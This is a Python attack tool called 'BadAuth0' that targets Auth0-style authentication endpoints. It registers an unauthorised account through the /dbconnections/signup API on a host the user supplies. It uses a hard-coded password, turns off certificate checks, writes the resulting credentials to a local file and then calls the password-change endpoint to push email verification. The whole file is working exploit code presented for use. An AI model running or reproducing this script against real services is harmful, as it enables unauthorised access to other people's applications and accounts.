import os
import sys
import time
import requests
import urllib3

# ANSI color codes for terminal output
BLUE = "\033[0;34m"  # Blue color code
RED = "\033[91m"    # Red color code
GREEN = "\033[32m"  # Green color code
END = "\033[0m"     # Reset color

# Banner
print(f"""{GREEN}
  ____            _    _   _   _ _   _      ___  
 | __ )  __ _  __| |  / \ | | | | |_| |__  / _ \ 
 |  _ \ / _` |/ _` | / _ \| | | | __| '_ \| | | |
 | |_) | (_| | (_| |/ ___ \ |_| | |_| | | | |_| |
 |____/ \__,_|\__,_/_/   \_\___/ \__|_| |_|\___/ 
{END}                                                                
""")
time.sleep(0.2)  # Pause for a brief moment for better UX

# Disable warnings for insecure requests (e.g., self-signed SSL certificates)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Function to create a directory for saving output files
def mk_dir(host):
    try:
        print(f"{GREEN}[+] Creating directory{END}")
        os.makedirs(host, exist_ok=True)  # Create the directory if it doesn't exist
        time.sleep(0.2)  # Brief pause for better UX
        path = os.path.abspath(host)  # Get absolute path of the directory
        print(f"{GREEN}[+] Directory successfully created\nPath: {path} {END}")
    except Exception as e:
        print(f"{RED}Error occurred while creating directory: {e}{END}")

# Function to exploit a vulnerability and create an account
def exploit(host, mail):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',
        'Content-Type': 'application/json'
    }

    payload = {
        'client_id': '',
        'email': mail,
        'password': 'rQ8a2;3/c[<J',  # Example password
        'connection': 'Username-Password-Authentication'
    }

    try:
        print(f"{GREEN}[+] Initializing the exploit...{END}")
        response = requests.post(
            f'https://{host}/dbconnections/signup',
            headers=headers,
            json=payload,
            verify=False,  # Don't verify SSL certificates
        )
        time.sleep(0.2)  # Brief pause for better UX

        status_code = response.status_code
        if status_code in [200, 201]:
            print(f"{GREEN}[+] Account successfully created\n{END}")
            print(f"{GREEN}[+] Email: {mail}\n{END}")
            print(f"{GREEN}[+] Pass: rQ8a2;3/c[<J\n{END}")
            print(f"{GREEN}[+] Status Code: {response.status_code}{END}")
            print(f"{GREEN}\n[+] Response body content: {response.text}{END}")
            with open(f"{host}/credentials.txt", "w") as file:
                file.write(f"Email: {mail}\nPassword: rQ8a2;3/c[<J\nStatus Code: {status_code}\nResponse: {response.text}")
        else:
            print(f"{RED}[-] The application returned status code: {status_code}{END}")
            try:
                error_json = response.json()
                if "connection" in error_json:
                    print(f"{RED}[-] Unable to find the required connection{END}")
                    print(response.text)
            except ValueError:
                print(f"{RED}[-] The response is not JSON, response text: {response.text}{END}")
    except Exception as e:
        print(f"{RED}Error occurred: {e}{END}")

# Function to verify the email address
def mail_verify(host, mail):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Priority': 'u=0, i',
        'Content-Type': 'application/json'
    }

    payload = {
        'email': mail,
        'connection': 'Username-Password-Authentication'
    }
    try:
        response = requests.post(
            f'https://{host}/dbconnections/change_password',
            headers=headers,
            json=payload,
            verify=False,
        )
        if response.status_code in [200, 201]:
            print(f"{GREEN}\n[+] Email verification sent to: {mail}{END}")
        else:
            print(f"{RED}[-] Unable to verify the mail address. Status Code: {response.status_code}{END}")
            try:
                error_json = response.json()
                print(f"{RED}[-] Server responded with: {error_json}{END}")
            except ValueError:
                print(f"{RED}[-] The response is not JSON, response text: {response.text}{END}")
    except Exception as e:
        print(f"{RED}Error occurred: {e}{END}")

# Main function to handle user input and call necessary functions
def main():
    if len(sys.argv) != 3:
        print(f"{RED}[+] Usage: {sys.argv[0]} <host> <your_mail_address>{END}")
        print(f"{RED}[+] Example: {sys.argv[0]} example.com hacker@gmail.com{END}")
        sys.exit(1)

    host = sys.argv[1]
    mail = sys.argv[2]
    mk_dir(host)  # Create directory for output
    exploit(host, mail)  # Attempt to exploit the vulnerability
    mail_verify(host, mail)  # Verify the email address

# Entry point of the script
if __name__ == "__main__":
    main()
